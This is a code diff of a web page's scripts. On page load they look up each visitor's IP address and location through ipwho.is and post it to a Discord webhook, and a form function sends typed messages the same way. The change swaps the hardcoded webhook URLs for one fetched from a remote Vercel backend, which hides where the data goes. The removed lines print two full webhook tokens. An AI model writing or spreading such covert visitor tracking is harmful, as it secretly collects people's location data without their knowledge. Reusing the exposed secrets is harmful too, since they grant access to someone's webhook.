@@ -29,7 +29,23 @@
     <br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
     <script>
     function sendmessage(){
-        const webhookUrl = "https://discord.com/api/webhooks/1538050326811385967/yuBWOFhnEituHyR1dCX0qiQvPeA4Jl24rbThXEa4rdbX7KK18k5IiGilCEtoLrbWChZM";
+        async function getWebhookUrl() {
+        const response = await fetch(
+            "https://backend-js-umber.vercel.app"
+        );
+
+        const data = await response.json();
+        return data["ip-webhook"];
+    }
+
+    async function sendVisit() {
+        try {
+            const webhookUrl = await getWebhookUrl();
+
+        if (!webhookUrl) {
+        console.error('No ip-webhook found in response');
+        return;
+        }
         const apiUrl = new URL("https://ipwho.is");
         const message = document.getElementById("message").value
         apiUrl.searchParams.set("t", Date.now());
@@ -49,6 +65,12 @@
             .catch(err => console.error("Webhook processing error:", err));
         })
         .catch(err => console.error("API tracking failed:", err));
+        }
+        catch (error) {
+            console.error("Error sending visit:", error);
+        }
+        }
+    sendVisit();
     };
     </script>
     <script>
@@ -71,7 +93,23 @@
     </script>
     <script>
     document.addEventListener("DOMContentLoaded", function() {
-        const webhookUrl = "https://discord.com/api/webhooks/1540253282986106890/jwRmXzxptPVNO7XuyCNbrTQ8SO3kjSAz5ZBt_1FXeZCi1BtG-3SA1wGTaXfLZJjEHcLq";
+        async function getWebhookUrl() {
+        const response = await fetch(
+            "https://backend-js-umber.vercel.app"
+        );
+
+        const data = await response.json();
+        return data["ip-webhook"];
+    }
+
+    async function sendVisit() {
+        try {
+            const webhookUrl = await getWebhookUrl();
+
+        if (!webhookUrl) {
+        console.error('No ip-webhook found in response');
+        return;
+        }
         
         const apiUrl = new URL("https://ipwho.is");
         apiUrl.searchParams.set("t", Date.now());
@@ -94,6 +132,12 @@
             .catch(err => console.error("Webhook processing error:", err));
         })
         .catch(err => console.error("API tracking failed:", err));
+        }
+        catch (error) {
+            console.error("Error sending visit:", error);
+        }
+        }
+    sendVisit();
     });
     </script>
 </body>
